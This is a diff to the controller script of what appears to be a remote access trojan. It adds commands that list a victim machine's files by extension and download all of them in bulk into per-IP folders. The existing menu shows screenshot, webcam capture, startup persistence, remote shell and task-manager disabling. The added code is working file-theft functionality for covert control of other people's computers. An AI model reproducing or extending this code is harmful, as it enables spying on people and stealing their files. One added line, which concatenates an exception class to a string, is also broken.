@@ -248,6 +248,20 @@ def browse_files():
 
     print("\n" + strClientResponse)
 
+def browse_files_bulk():
+    conn.send(str.encode("filebrowserbulk"))
+    strExt = input("File extension: ")
+    if strExt == "":
+        strExt = "Invalid"
+    conn.send(str.encode(strExt))
+
+    strClientResponse = conn.recv(1024).decode("utf-8")  # get buffer size
+
+    intBuffer = int(strClientResponse)
+    strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data
+
+    print("\n" + strClientResponse)
+    return strClientResponse
 
 def startup():
     conn.send(str.encode("startup"))
@@ -289,6 +303,11 @@ def receive():
 
     if strFile == "" or strFileOutput == "":  # if the user left an input blank
         return
+    strFileOutput = os.path.join(strIP, strFileOutput)
+    dirPath = os.path.dirname(strFileOutput)
+    # create directory if it does not exist
+    if not os.path.exists(dirPath):
+         os.makedirs(dirPath)
 
     conn.send(str.encode("recv" + strFile))
     strClientResponse = conn.recv(1024).decode("utf-8")
@@ -316,6 +335,48 @@ def receive():
 
     print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")
 
+def receive_bulk():
+    fileListStr = browse_files_bulk()
+    fileListArr = fileListStr.split("\n")
+    for strFile in fileListArr:
+        print(strFile)
+        #strFile = input("\n" + "Target file: ")
+        f_Path = os.path.join(strIP, strFile.replace(":","_",1))
+        dirPath = os.path.dirname(f_Path)
+        # create directory if it does not exist
+        if not os.path.exists(dirPath):
+             os.makedirs(dirPath)
+
+        strFileOutput = f_Path
+    
+        if strFile == "" or strFileOutput == "":  # if the user left an input blank
+            return
+    
+        conn.send(str.encode("recv" + strFile))
+        strClientResponse = conn.recv(1024).decode("utf-8")
+    
+        print(strClientResponse)
+    
+        if strClientResponse == "Target file not found!":
+            return
+    
+        intBuffer = ""
+        for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
+            if strClientResponse[intCounter].isdigit():
+                intBuffer += strClientResponse[intCounter]
+        intBuffer = int(intBuffer)
+    
+        file_data = recvall(intBuffer)  # get data and write it
+    
+        try:
+            objFile = open(strFileOutput, "wb")
+            objFile.write(file_data)
+            objFile.close()
+        except:
+            print("Path is protected/invalid!")
+            return
+    
+        print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")
 
 def lock_res_shut(args):
     conn.send(str.encode("shutreslock"))
@@ -418,11 +479,13 @@ def show_help():
     print("--m Send message")
     print("--o Open a website")
     print("--r Receive file from the user")
+    print("--rb Bulk receive file(s) from the user by file extension")
     print("--s Send file to the user")
     print("--p (1) Take screenshot")
     print("--p (2) Take webcam snapshot")
     print("--a Run at startup")
     print("--v View files")
+    print("--ve View files by extension")
     print("--u User Info")
     print("--e Open remote cmd")
     print("--d Disable task manager")
@@ -463,10 +526,14 @@ def send_commands():
                 webpic()
             elif strChoice == "--v":
                 browse_files()
+            elif strChoice == "--ve":
+                browse_files_bulk()
             elif strChoice == "--s":
                 send_file()
             elif strChoice == "--r":
                 receive()
+            elif strChoice == "--rb":
+                receive_bulk()
             elif strChoice[:3] == "--x" and len(strChoice) > 3:
                 blnClose = lock_res_shut(strChoice[3:len(strChoice)])
                 if blnClose == "True":  # if the computer is shutdown
@@ -490,7 +557,7 @@ def send_commands():
                 print("Invalid choice, please try again!")
 
     except socket.error:  # if there is a socket error
-        print("Error, connection was lost!" + "\n")
+        print("Error, connection was lost!" + "\n" + socket.error)
         return
 
 
